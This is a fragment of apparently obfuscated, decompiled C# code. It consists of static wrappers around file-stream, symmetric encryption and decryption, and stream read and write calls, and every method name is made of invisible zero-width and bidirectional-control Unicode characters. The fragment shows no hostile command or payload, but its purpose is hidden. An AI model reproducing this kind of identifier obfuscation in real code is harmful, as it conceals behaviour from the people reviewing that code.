    static bool \u206E‬⁭⁬‍‌‌⁭‮‫‫‮⁪⁫⁬‬⁫⁮‏‌‪‎‍⁬‮​‬‏⁭‫‮‎‌⁫⁮​⁬⁮⁬⁫‮([In] string obj0, [In] string obj1) => obj0.EndsWith(obj1);

    static int \u206D⁫⁪‎‭⁮‫‮⁬‫‮‏‍⁫‪⁮‪‭‬​‎‎‭‫‪​‫​⁬⁪‬⁮‮​⁫⁬‍‬⁭‪‮([In] string obj0) => obj0.Length;

    static string \u202E⁬‎‎​‏‮‫⁯‭‪⁯⁬‌‎‏‫⁭‍‍‭‍⁬‭‮⁬⁯‭⁮⁪⁪⁯‏⁬⁪‮⁯⁫⁯‪‮([In] string obj0, [In] int obj1) => obj0.Remove(obj1);

    static FileStream \u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(
      [In] string obj0,
      [In] FileMode obj1)
    {
      return new FileStream(obj0, obj1);
    }

    static ICryptoTransform \u206B⁯⁬​⁫‮⁭‪⁬⁭⁭⁪‮‎‮‫⁫⁭‬‬‭​⁪⁪‫‭​‪‬‭‏⁬⁭‪‭‎‬‮‭‍‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateEncryptor();
    }

    static CryptoStream \u202B‌​‏⁯⁪‎‌‫‭‪‭‪‬⁬⁯‎⁬⁫⁫‫⁮‎‎⁫‭‬⁫‬‏‌‮‍‫⁬⁫‪⁪‍‬‮(
      [In] Stream obj0,
      [In] ICryptoTransform obj1,
      [In] CryptoStreamMode obj2)
    {
      return new CryptoStream(obj0, obj1, obj2);
    }

    static int \u206E‏⁫‬‮⁮‏‍⁪⁪⁫⁯​‌⁮‏⁮⁪‌‍⁯⁫‫‪​‭⁯‬‎‬‍⁬⁪‬⁯‪‍‎‬‬‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.Read(obj1, obj2, obj3);
    }

    static void \u200D⁭⁯‬‭⁮⁬‫‎‬⁬‭⁬⁫⁬⁪‮‪‏​‏​‮‪​⁯‮‫‭‫⁫‭‎​⁭⁭‭⁮⁮⁪‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      obj0.Write(obj1, obj2, obj3);
    }

    static ICryptoTransform \u206E‮‌‍‎‫​‮‍‫‎‫‮⁮‏‎⁪⁭‏‭‎⁬‍⁭⁪‬⁬​⁯‪⁯‌‬‌⁮‌‎‏⁭‍‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateDecryptor();
    }
  }
}
